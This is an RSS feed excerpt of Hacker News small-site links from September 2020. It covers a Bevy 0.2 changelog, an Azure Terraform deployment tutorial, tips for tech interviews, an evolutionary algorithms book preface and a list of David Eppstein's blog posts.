<li><a href="https://github.com/bevyengine/bevy/pull/451">Update docs for Updated, Changed and Mutated</a></li>
<li>Tips for faster builds on macOS: <a href="https://github.com/bevyengine/bevy/pull/312">#312</a>, <a href="https://github.com/bevyengine/bevy/pull/314">#314</a>, <a href="https://github.com/bevyengine/bevy/pull/433">#433</a></li>
<li>Added and documented cargo features
<ul>
<li><a href="https://github.com/bevyengine/bevy/pull/249">Created document <code>docs/cargo_features.md</code>.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/249">Added features for x11 and wayland display servers.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/363">and added a feature to disable libloading.</a> (helpful for WASM support)</li>
</ul>
</li>
<li>Added more instructions for Linux dependencies
<ul>
<li><a href="https://github.com/bevyengine/bevy/pull/275">Arch / Manjaro</a>, <a href="https://github.com/bevyengine/bevy/pull/290">NixOS</a>, <a href="https://github.com/bevyengine/bevy/pull/463">Ubuntu</a> and <a href="https://github.com/bevyengine/bevy/pull/331">Solus</a></li>
</ul>
</li>
<li><a href="https://github.com/bevyengine/bevy/pull/491">Provide shell.nix for easier compiling with nix-shell</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/505">Add <code>AppBuilder::add_startup_stage_|before/after</code></a></li>
</ul>
<h3 id="changed">Changed</h3>
<ul>
<li><a href="https://github.com/bevyengine/bevy/pull/374">Transform rewrite</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/504">Use generational entity ids and other optimizations</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/417">Optimize transform systems to only run on changes.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/323">Send an AssetEvent when modifying using <code>get_id_mut</code></a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/332">Rename <code>Assets::get_id_mut</code> -&gt; <code>Assets::get_with_id_mut</code></a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/183">Support multiline text in <code>DrawableText</code></a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/324">iOS: use shaderc-rs for glsl to spirv compilation</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/304">Changed the default node size to Auto instead of Undefined to match the Stretch implementation.</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/478">Load assets from root path when loading directly</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/485">Add <code>render</code> feature</a>, which makes the entire render pipeline optional.</li>
</ul>
<h3 id="fixed">Fixed</h3>
<ul>
<li><a href="https://github.com/bevyengine/bevy/pull/361">Properly track added and removed RenderResources in RenderResourcesNode.</a>
<ul>
<li>Fixes issues where entities vanished or changed color when new entities were spawned/despawned.</li>
</ul>
</li>
<li><a href="https://github.com/bevyengine/bevy/pull/385">Fixed sprite clipping at same depth</a>
<ul>
<li>Transparent sprites should no longer clip.</li>
</ul>
</li>
<li><a href="https://github.com/bevyengine/bevy/pull/345">Check asset path existence</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/376">Fixed deadlock in hot asset reloading</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/394">Fixed hot asset reloading on Windows</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/406">Allow glTFs to be loaded that don't have uvs and normals</a></li>
<li><a href="https://github.com/bevyengine/bevy/pull/383">Fixed archetypes_generation being …</a></li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bevyengine.org/news/bevy-0-2/">https://bevyengine.org/news/bevy-0-2/</a></em></p>]]>
            </description>
            <link>https://bevyengine.org/news/bevy-0-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530698</guid>
            <pubDate>Sat, 19 Sep 2020 22:21:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CNC Fabric Cutting]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24530681">thread link</a>) | @zdw
<br/>
September 19, 2020 | http://www.neufeld.newton.ks.us/electronics/?p=1827 | <a href="https://web.archive.org/web/*/http://www.neufeld.newton.ks.us/electronics/?p=1827">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://www.neufeld.newton.ks.us/electronics/?p=1827</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530681</guid>
            <pubDate>Sat, 19 Sep 2020 22:18:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Provisioning an App Service on Azure Using Terraform with AzureDevOps]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24530366">thread link</a>) | @lokethien
<br/>
September 19, 2020 | https://www.andreasrein.net/posts/app-service-terraform-azure-azuredevops/ | <a href="https://web.archive.org/web/*/https://www.andreasrein.net/posts/app-service-terraform-azure-azuredevops/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<article>
  
  <div><p>Part of a good DevOps routine is to have the infrastructure as code. This way you can utilize a high level of control with source control. You can also effortlessly spin up another identical environment.</p>

<h2 id="terraform">Terraform</h2>

<p>If you have a sizable project that has a lot of resources or a DevOps enthusiast, it may be smart to keep it in source control.</p>

<p>Terraform is Hashicorp’s solution for <em>IaC</em>. The configuration language of choice is HcL (Hashicorp configuration language). Please do not fear learning a new language. HcL is highly enjoyable and simple to learn. It’s also multi-cloud so you can learn Terraform once and use it to provision resources on AWS, Azure, and Google Cloud.</p>

<p>The Azure provider is relatively mature and it’s in constant development. It’s open-source so if you are having issues, you can always create an issue on their repository. If you absolutely cannot do what you want to do using Terraform, you could always use ARM templates in Terraform or even CLI commands. So let’s go through the tutorial of using it in Azure with CI/CD using Azure DevOps.</p>

<h2 id="recipe">Recipe</h2>

<h3 id="1-install-terraform-extension">1. Install Terraform extension</h3>

<p>In this tutorial, I will use an extension to AzureDevOps that will enable us to run Terraform in our build pipeline. Get it <a href="https://marketplace.visualstudio.com/items?itemName=ms-devlabs.custom-terraform-tasks">here</a> and install it in your organization.</p>

<h3 id="2-create-project-on-azuredevops">2. Create project on AzureDevOps</h3>

<p>Before you start creating a pipeline, you should have a project ready on AzureDevOps. Remember that the service <code>Pipelines</code> needs to be on (can be turned on in settings -&gt; overview) and <code>Repos</code> as well.</p>

<p>After that, you should create a repository and clone it to your desktop. Since the pipeline will include two stages; develop and master, it is smart to create a branch <code>develop</code> out from <code>master</code>.</p>

<h3 id="3-set-up-a-service-connection">3. Set-up a service connection</h3>

<p>A service connection enables you to hook-up the AzureDevOps project to the magical fairy-cloud of Azure. Create it by going to <code>Project settings</code> → <code>Service connections</code> and hit new service connection from the top right corner. There you select <code>Azure Resource Manager</code> and then you can use <code>Service principal (automatic)</code> as the authentication method.</p>

<p><img src="https://www.andreasrein.net/images/06-app-service-terraform/azure-devops-service-connection.png"></p>

<p>You then select the scope but remember that if you want Terraform to be able to create resource groups, you should leave the <code>Resource group</code> select as unselected. Pick a short and sweet name, create and you are good to go. I distinguish between the development environment and the production environment in this tutorial and, you should preferably do that too. If you do so, you can use two different subscriptions.</p>

<h3 id="4-install-terraform">4. Install Terraform</h3>

<p>Download Terraform <a href="https://www.terraform.io/downloads.html">here</a>, zip it out and put it somewhere on your disk. Remember to add it to your system’s <code>PATH</code>.</p>

<h3 id="5-write-infrastructure-code">5. Write infrastructure code</h3>

<p>The fun begins after you have successfully installed Terraform. You can finally start writing deliberate infrastructure code in HcL so warm your fingers up and let’s start by getting your editor ready. If you are using Visual Studio Code, I highly recommend the excellent plugin <a href="https://marketplace.visualstudio.com/items?itemName=mauve.terraform">Terraform</a>.</p>

<p>So create these files:</p>

<ul>
<li>variables.tf</li>
<li>variables/dev.tfvars</li>
<li>variables/prod.tfvars</li>
<li>main.tf</li>
</ul>

<p><em>Terraform can be highly modular but for the purpose of this guide, I have decided to keep it as simple as possible.</em></p>

<h4 id="variables-tf">variables.tf</h4>

<p><code>variables.tf</code> is the home of all the variables but not the values themselves. The values can be found in the environment specific .tfvars files.</p>

<pre><code># General
variable "resource_group_name" {
  description = "The name of the resource group"
}

variable "location" {
  description = "The Azure region in which all resources should be created"
}

# App Service
variable "app_service_plan_name" {
  description = "The name of the app service plan for the backend"
}

variable "app_service_name" {
  description = "The name of the app service for the backend"
}

# Application Insights
variable "application_insights_name" {
  description = "The name of the application insights resource"
}
</code></pre>

<h4 id="variables-dev-tfvars">variables/dev.tfvars</h4>

<p><code>variables/</code> is the folder with the environment specific variable values. The example uses an homegrown Azure resources naming convention. Go with what you like as long as you keep it consistent.</p>

<pre><code>resource_group_name                       = "rg-terraform-dev"
location                                  = "West Europe"
app_service_plan_name_backend             = "azappp-terraform-dev"
app_service_name_backend                  = "azapp-terraform-dev"
application_insights_name                 = "appi-terraform-dev"
</code></pre>

<h4 id="variables-prod-tfvars">variables/prod.tfvars</h4>

<pre><code>resource_group_name                       = "rg-terraform-prod"
location                                  = "West Europe"
app_service_plan_name_backend             = "azappp-terraform-prod"
app_service_name_backend                  = "azapp-terraform-prod"
application_insights_name                 = "appi-terraform-prod"
</code></pre>

<h4 id="main-tf">main.tf</h4>

<p><code>main.tf</code> is where the infrastructure code resides. The Azure Provider is well documented and it can be found <a href="https://www.terraform.io/docs/providers/azurerm/">here</a>.</p>

<pre><code>/*
* Provider block defines which provider they require
*/

provider "azurerm" {
  version = "=2.26.0"
  features {}
}

terraform {
  backend "azurerm" {}
}

/*
* Resource Group
*/
resource "azurerm_resource_group" "this" {
  name     = var.resource_group_name
  location = var.location
}

/*
* App Service Plan
*/
resource "azurerm_app_service_plan" "this" {
  name                = var.app_service_plan_name
  location            = azurerm_resource_group.this.location
  resource_group_name = azurerm_resource_group.this.name
  kind                = "Windows"

  sku {
    tier = "Standard"
    size = "S1"
  }
}

/*
* App Service
*/
resource "azurerm_app_service" "this" {
  name                = var.app_service_name
  location            = azurerm_resource_group.this.location
  resource_group_name = azurerm_resource_group.this.name
  app_service_plan_id = azurerm_app_service_plan.this.id

  site_config {
    websockets_enabled = true
  }

  app_settings = {
    "APPINSIGHTS_INSTRUMENTATIONKEY"      = "${azurerm_application_insights.this.instrumentation_key}"
    "APPINSIGHTS_PORTALINFO"              = "ASP.NET"
    "APPINSIGHTS_PROFILERFEATURE_VERSION" = "1.0.0"
    "WEBSITE_HTTPLOGGING_RETENTION_DAYS"  = "35"
  }
}

/*
* Application Insights
*/
resource "azurerm_application_insights" "this" {
  name                = var.application_insights_name
  location            = azurerm_resource_group.this.location
  resource_group_name = azurerm_resource_group.this.name
  application_type    = "web"
}
</code></pre>

<h3 id="6-create-storage-account-for-state-files">6. Create storage account for state files</h3>

<p>Terraform relies on a state file so it can know what has been done and so forth. The Terraform extension will use a storage account in Azure that we define. So go to your Azure portal and create these resources or use your existing ones.</p>

<ul>
<li>Resource Group: rg-terraform-demo</li>
<li>Storage Account: stterraformdemo</li>
<li>Storage Container: terraform</li>
</ul>

<p>The resource naming is completely optional since they are inside the azure-pipelines.yml file. Remember to double-check the state file resources in <code>azure-pipelines.yml</code>.</p>

<h3 id="7-write-build-pipeline">7. Write build pipeline</h3>

<p>The infrastructure is defined and ready to be deployed on Azure but before we can do that, we would have to define the AzureDevOps build pipeline.</p>

<p>In this example, I will use a deployment template so we can keep it clean in the main azure-pipelines file and reuse it later.</p>

<p>So create these files:</p>

<ul>
<li>azure-pipelines.yml</li>
<li>azure-pipelines-deployment-template.yml</li>
</ul>

<h4 id="azure-pipelines-yml">azure-pipelines.yml</h4>

<p>The two stages, <code>DeployDev</code> and <code>DeployProd</code> is identical apart from the variables passed in the template and that the <code>DeployProd</code> only triggers from the <code>master</code> branch.</p>

<pre><code># Set how the build pipeline triggers
trigger:
  branches:
    include:
      - develop
      - master

# Just say its gonna trigger on pull requests too
pr:
  branches:
    include:
      - develop
      - master

variables:
  # Name of the pipeline. Defaults to the AzureDevOps project name but it can be changed.
  - name: pipelineName
    value: TerraformDemo
  # Name of the resource group where the state file lies
  - name: tfStateRgName
    value: rg-terraform-demo
  # Name of the storage account for the state file
  - name: tfStateStName
    value: stterraformdemo
  # Name of the container for the state file
  - name: tfStateCtrName
    value: terraform

stages:
- stage: DeployDev
  displayName: Deploy Dev
  jobs:
  - template: azure-pipelines-deployment-template.yml
    parameters:
      environment: 'Dev'
      pipelineName: ${{variables.pipelineName}}
      backendServiceName: AzureDev
      tfStateRgName: ${{variables.tfStateRgName}}
      tfStateStName: ${{variables.tfStateStName}}
      tfStateCtrName: ${{variables.tfStateCtrName}}

- stage: DeployProd
  displayName: Deploy Prod
  condition: and(succeeded(), eq(variables['Build.SourceBranch'], 'refs/heads/master'))
  jobs:
  - template: azure-pipelines-deployment-template.yml
    parameters:
      environment: 'Prod'
      pipelineName: '${{variables.pipelineName}}'
      backendServiceName: AzureProd
      tfStateRgName: '${{variables.tfStateRgName}}'
      tfStateStName: '${{variables.tfStateStName}}'
      tfStateCtrName: '${{variables.tfStateCtrName}}'
</code></pre>

<h4 id="azure-pipelines-deployment-template-yml">azure-pipelines-deployment-template.yml</h4>

<pre><code>parameters:
- name: 'environment'
  type: 'string'
  displayName: 'The name of the environment'

- name: 'pipelineName'
  type: 'string'
  displayName: 'The name of the pipeline'

- name: 'backendServiceName'
  type: 'string'
  displayName: 'The name of the backend service'

- name: 'tfStateRgName'
  type: 'string'
  displayName: 'The name of the az resource group where the tf state file should be'

- name: 'tfStateStName'
  type: 'string'
  displayName: 'The name of the az storage account where the tf state file should be'

- name: 'tfStateCtrName'
  type: 'string'
  displayName: 'The name of the az storage account container where the tf state should be'

jobs:
  - job: Deploy
    displayName: Deploy ${{parameters.environment}}
    continueOnError: false
    pool:
      name: 'Azure Pipelines'
      vmImage: 'windows-latest'
    steps:
    - task: …</code></pre></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.andreasrein.net/posts/app-service-terraform-azure-azuredevops/">https://www.andreasrein.net/posts/app-service-terraform-azure-azuredevops/</a></em></p>]]>
            </description>
            <link>https://www.andreasrein.net/posts/app-service-terraform-azure-azuredevops/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530366</guid>
            <pubDate>Sat, 19 Sep 2020 21:16:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tips for Passing the (Broken) Tech Interview]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24530334">thread link</a>) | @mgdev
<br/>
September 19, 2020 | https://mg.dev/3-tips-for-passing-the-broken-tech-interview/ | <a href="https://web.archive.org/web/*/https://mg.dev/3-tips-for-passing-the-broken-tech-interview/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>I've been fortunate to work for multiple top technology companies in my career, including AWS/Amazon, Oracle, and Facebook. There are classes of problems you can only tackle at companies like these, where billions of dollars of business flows through systems that you design and build. It's fulfilling knowing something you've created has touched thousands, millions, or in some cases of <em>billions</em> of people. </p><p>But I didn't start my career in big tech. I'm just a simple kid from Montana—and a college dropout at that. My entry into the world of software started with freelancing, contract gigs, and startups. While landing that work without a "proper education" certainly wasn't easy, the level of scrutiny that smaller companies apply in their interview process tended to be considerably lower than most Bay Area and Seattle technology companies. </p><p>I remember my first interview at one of these giants. It was for a Software Development Engineer (SDE) position at AWS. <strong>I didn't pass the interview loop.</strong> But did well enough that they invited me back for a Web Development Engineer (WDE) loop, which I cleared. I converted to SDE roughly six months later. </p><p>After joining, I remember thinking how poorly I prepared for the interview process, and how much time I wasted by not preparing. I could clearly do the job, or else they wouldn't have let me convert so quickly. I wished I knew how different it was compared to anything I had done before. In total, I had to clear <em>nine interviews</em> to get that WDE offer. It was intense. </p><p>That was a decade ago. Since then, I've been been in many similar interviews, and have been on the other side of the table hundreds of times—as interviewer, interview lead, and hiring manager. </p><p>There are dozens of great books on technical interviewing. But I'd like to offer three tips that I think are most easily overlooked while preparing for a technical interview. <strong>These tips are overlooked because they acknowledge that technical interviewing is a fundamentally broken process at most large companies.</strong> </p><p>Yes, they ask you to solve problems that you'll rarely have to tackle day-to-day. This is well-known and discussed often in tech circles. But more importantly, <em><strong>interviewers are biased and often poorly trained</strong></em>. Corporate cross-breeding spawns interview behaviors that are poor imitations of their original, more effective versions. These things—more than anything technical—have the greatest potential to tank your interview.</p><p>Here are three tips to help you survive this mess.</p><h3 id="1-assess-your-interviewer-">1: Assess your interviewer. </h3><p>Technical interviewing is a distinct skill from software development. </p><p>But... tech interviewing is broken. So your meta-job as an interviewee is to understand what kind <em>what kind of broken</em>—what kind of company you're interviewing at, what kind of process they have, what kind of cultural background has informed their evaluation processes. You need to quickly understand how proficient your interviewer is, what their biases are, and whether or not he or she will do a faithful job representing you, the candidate. </p><p>Your job during an interview is to 1) convince that person they like you, and 2) arm that person with all the evidence they need to support you—preferably in that order.</p><h3 id="2-keep-talking-interviewers-fill-silences-with-their-own-biases-">2: Keep talking. Interviewers fill silences with their own biases. &nbsp; </h3><p>Silence can be deadly in an interview, so keep information flowing. If you truly need quiet to think, explicitly say this to your interviewer: "I need a few moments to collect my thoughts. I'll explain my thinking in a minute, before I begin."</p><p>Your interviewer's job is to evaluate not just your skills, but your working method and clarity of thought. Does this person get along with his/her peers? Do they have a structured way of breaking down problems? Would I enjoy working with this person? </p><p>They're in evaluation mode, trying to understand what's going through your head. <em>But they're also human.</em> If they don't know what you're thinking, they'll almost inevitably fill in the blanks with whatever biases they've formed so far. </p><p>I've seen 3 minutes of silence by one candidate reported as, <em>"They thoughtfully considered the problem before trying to put code on the board."</em> </p><p>I've seen those same 3 minutes described as, <em>"They struggled to get traction on the problem, and didn't start writing code without repeated prompting."</em></p><p>Messed up, huh? I'm not saying it's right. I'm saying you have to assume it will happen, and prepare for it. </p><h3 id="3-create-a-conspiracy-interviewers-are-more-likely-to-recommend-someone-they-feel-an-affinity-with-">3: Create a conspiracy. Interviewers are more likely to recommend someone they feel an affinity with. </h3><p>While #1 and #2 are about overcoming unfair flaws in the interview process, #3 is about exploiting them for your own gain. </p><p>Your tech interviewer is probably a mostly-normal person. It's easy to forget that when they're grilling you about compression algorithms and time complexities. But underneath that piercing glare is a meat-sack of hopes, fears, insecurities, and desires—just like anyone else. </p><p>In an interview setting, the <em>desire for belonging</em> is the easiest to exploit. We all want to feel like we're part of the group—safe, powerful.</p><p>The maneuver for this is simple enough:</p><ol><li><strong><em>Briefly discuss something you know your interview would like to strongly associate with, but may not actually be.</em></strong> Maybe it's being the most senior engineer in the org. Maybe it's working on the hardest problems in the industry. </li><li><strong><em>Associate yourself with that thing.</em></strong> Humbly imply that you were associated with these things in the past (without lying), and that you're excited to see what kind of similar opportunities are available here, at this company.</li><li><strong><em>Imply that the interviewer is obviously also associated with that thing.</em></strong> Imply that they obviously understand what you're talking about—that you're part of the same club.</li></ol><p>With these three steps, you've created a co-conspirator—someone who shares a special, secret connection. If it sticks, they can't help but start to like you, because they've associated <em>themselves</em> with you, and the natural bias to to favor themselves—and thus you.</p><h2 id="unfortunate-truths">Unfortunate Truths</h2><p>You may not want to participate in such a broken process. You may think that by playing to the process, you're somehow reinforcing it. To some extent, you are. But shy of instigating an industry-wide boycott or starting your own company, if you want to work at one of these big tech companies, you take the good—the ability to create value for millions of people, to develop and empower your teammates, to create cool things—with the bad. Your options are to ignore these realities, or plan for them. </p><p><strong><em>And once you've made it, gosh darnit, make it your mission to improve things! </em></strong>Lobby to change the interview process, focusing on ownership, effective cross-functional collaboration (including so-called "soft skills"), and customer obsession. Take or help create interview training, <em>especially around unconscious bias</em>. Fix inefficiencies. Focus on candidate experience, and on align it with the outcomes you want.</p><p>But until then, tuck these tips in your back pocket, and don't be afraid to use them. </p>
			</section></div>]]>
            </description>
            <link>https://mg.dev/3-tips-for-passing-the-broken-tech-interview/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530334</guid>
            <pubDate>Sat, 19 Sep 2020 21:11:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: My Python Notebook Driven Book on Evolutionary Algorithms]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24530288">thread link</a>) | @DataCrayon
<br/>
September 19, 2020 | https://datacrayon.com/posts/search-and-optimisation/practical-evolutionary-algorithms/preface/ | <a href="https://web.archive.org/web/*/https://datacrayon.com/posts/search-and-optimisation/practical-evolutionary-algorithms/preface/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div>
<div>

<p>Evolutionary Algorithms (<em>EAs</em>) are a fascinating class of algorithms for meta-heuristic optimisation. There exist many books on the topic of EAs, ranging from their theory to practice. The first book I read on the topic was <em>Genetic algorithms in search, optimization, and machine learning</em> by David E. Goldberg (1989), and to this day I still recommend it to new students in the field.</p>

</div>
</div>
</div><div>

<div>
<p>However, there is a re-occurring difficulty when my students are starting out in the field, <em>"how do I move from theory to practice?"</em>. Most books will have some chapters dedicated to applications of EAs, but what's missing is an up-to-date book dedicated to using modern technology and concepts.</p>
</div>
</div><div>

<div>
<div>
<p>When writing this book, I had to answer some difficult questions:</p>
<ul>
<li>What programming language will my examples be written in?</li>
<li>What software libraries will I use?</li>
<li>How do I structure the chapters and sections, do I lead entirely by example or do I dedicate some parts to the theory?</li>
<li>Do I focus on single-objective EAs or multi-objective EAs?</li>
</ul>
<p>Nevertheless, the decisions had to be made. I selected Python as the programming language simply due to its rise in popularity (in 2019), and this was only a difficult choice because there is a wealth of resources written for MATLAB. Of the resources written in MATLAB, it is a shame to not be able to use PlatEMO, which is a well-maintained open-source platform for Evolutionary Multi-objective Optimisation. In its place, when a software library is needed, I will turn to Platypus, which provides optimisation algorithms and analysis tools for multi-objective optimisation.</p>
<p>For the structure of the chapters and sections, I have decided to lead entirely by example. There will be code to demonstrate every concept used, and I will show how we can implement algorithms from their mathematical representation. In these cases, I will focus on the readability of the implementations rather than their performance.</p>
<p>Finally, I will focus on multi-objective EAs as this represents the majority of real-world problems. However, single-objective EAs will make an appearance to highlight the differences between the two.</p>

</div>
</div>
</div><div>

<div>
<p>Perhaps the most difficult question to answer is <em>where do we start?</em> There is so much to cover, and many potential starting points. For this book, I will start with a definition of objective functions, and illustrate the relationship between what we call the problem space and the objective space. With this approach, I hope there will be a clear understanding of what the various operators within an EA are affecting.</p>
</div>
</div></div>]]>
            </description>
            <link>https://datacrayon.com/posts/search-and-optimisation/practical-evolutionary-algorithms/preface/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530288</guid>
            <pubDate>Sat, 19 Sep 2020 21:01:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Blog of David Eppstein]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24530267">thread link</a>) | @nurettin
<br/>
September 19, 2020 | https://11011110.github.io/blog/all/ | <a href="https://web.archive.org/web/*/https://11011110.github.io/blog/all/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <div>
  
  <ul>
    
      <li>
        <span>Sep 15, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/09/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Sep 7, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/09/07/eberhards-theorem-bipartite.html">Eberhard's theorem for bipartite polyhedra with one big face</a>
        </h2>
      </li>
    
      <li>
        <span>Sep 1, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/09/01/isosceles-polyhedra.html">Isosceles polyhedra</a>
        </h2>
      </li>
    
      <li>
        <span>Aug 30, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/08/30/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Aug 22, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/08/22/bricards-jumping-octahedron.html">Bricard's jumping octahedron</a>
        </h2>
      </li>
    
      <li>
        <span>Aug 15, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/08/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Aug 7, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/08/07/report-from-cccg.html">Report from CCCG</a>
        </h2>
      </li>
    
      <li>
        <span>Aug 2, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/08/02/sona-enumeration.html">Sona enumeration</a>
        </h2>
      </li>
    
      <li>
        <span>Jul 31, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/07/31/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Jul 29, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/07/29/polyhedra-convex-unfoldings.html">Polyhedra with convex unfoldings</a>
        </h2>
      </li>
    
      <li>
        <span>Jul 22, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/07/22/three-cccg-videos.html">Three CCCG videos</a>
        </h2>
      </li>
    
      <li>
        <span>Jul 16, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/07/16/comparing-multi-sport.html">Comparing multi-sport athletes using bounding-box area</a>
        </h2>
      </li>
    
      <li>
        <span>Jul 15, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/07/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Jul 12, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/07/12/graham-pollak-partitions.html">Graham–Pollak partitions</a>
        </h2>
      </li>
    
      <li>
        <span>Jul 5, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/07/05/shape-wankel-rotor.html">The shape of the Wankel rotor</a>
        </h2>
      </li>
    
      <li>
        <span>Jun 30, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/06/30/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Jun 28, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/06/28/sorting-integer-offsets.html">Sorting with integer offsets</a>
        </h2>
      </li>
    
      <li>
        <span>Jun 21, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/06/21/subpract.html">Subpract</a>
        </h2>
      </li>
    
      <li>
        <span>Jun 15, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/06/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Jun 14, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/06/14/infinite-threshold-graphs.html">Infinite threshold graphs, four different ways</a>
        </h2>
      </li>
    
      <li>
        <span>May 31, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/05/31/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>May 15, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/05/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>May 12, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/05/12/inbox-of-triangle.html">The inbox of a triangle</a>
        </h2>
      </li>
    
      <li>
        <span>May 3, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/05/03/hanoi-vs-sierpinski.html">Hanoi vs Sierpiński</a>
        </h2>
      </li>
    
      <li>
        <span>Apr 30, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/04/30/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Apr 28, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/04/28/cartesian-triangle-centers.html">Cartesian triangle centers</a>
        </h2>
      </li>
    
      <li>
        <span>Apr 19, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/04/19/stretch-average-stretch.html">Stretch, average stretch, and expected stretch of spanning trees</a>
        </h2>
      </li>
    
      <li>
        <span>Apr 15, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/04/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Mar 31, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/03/31/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Mar 29, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/03/29/backyard-sunlight.html">Backyard sunlight</a>
        </h2>
      </li>
    
      <li>
        <span>Mar 22, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/03/22/uci-ecological-preserve.html">UCI Ecological Preserve</a>
        </h2>
      </li>
    
      <li>
        <span>Mar 15, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/03/15/stay-home-linkage.html">Stay-at-home linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Mar 11, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/03/11/more-uniqueness-sudoku.html">More on uniqueness in Sudoku</a>
        </h2>
      </li>
    
      <li>
        <span>Mar 8, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/03/08/mathematics-books-women.html">Mathematics books by women</a>
        </h2>
      </li>
    
      <li>
        <span>Feb 29, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/02/29/leap-day-linkage.html">Leap day linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Feb 22, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/02/22/applications-maximum-matching.html">Two applications of maximum matching</a>
        </h2>
      </li>
    
      <li>
        <span>Feb 19, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/02/19/snowflake-spanners.html">Snowflake spanners</a>
        </h2>
      </li>
    
      <li>
        <span>Feb 17, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/02/17/spanners-have-sparse.html">Spanners have sparse crossings</a>
        </h2>
      </li>
    
      <li>
